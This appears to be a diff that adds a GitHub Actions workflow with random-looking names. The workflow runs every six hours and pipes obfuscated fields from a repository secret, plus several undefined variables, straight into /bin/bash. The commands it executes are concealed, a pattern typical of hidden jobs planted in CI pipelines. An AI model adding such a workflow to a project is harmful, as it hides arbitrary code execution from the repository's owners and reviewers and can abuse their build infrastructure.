@@ -1,0 +1,19 @@
+name: baileyidaoo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: baileyidaoo
+        env:
+          z86: ${{ secrets.z86 }}
+        run: |
+          echo $z86 | jq -r .ff5973 | /bin/bash
+          echo $mcip1937 | jq -r .oklns05 | /bin/bash
+          echo $z03244 | jq -r .s445 | /bin/bash
+          echo $ssf17037 | jq -r .t33 | /bin/bash
+
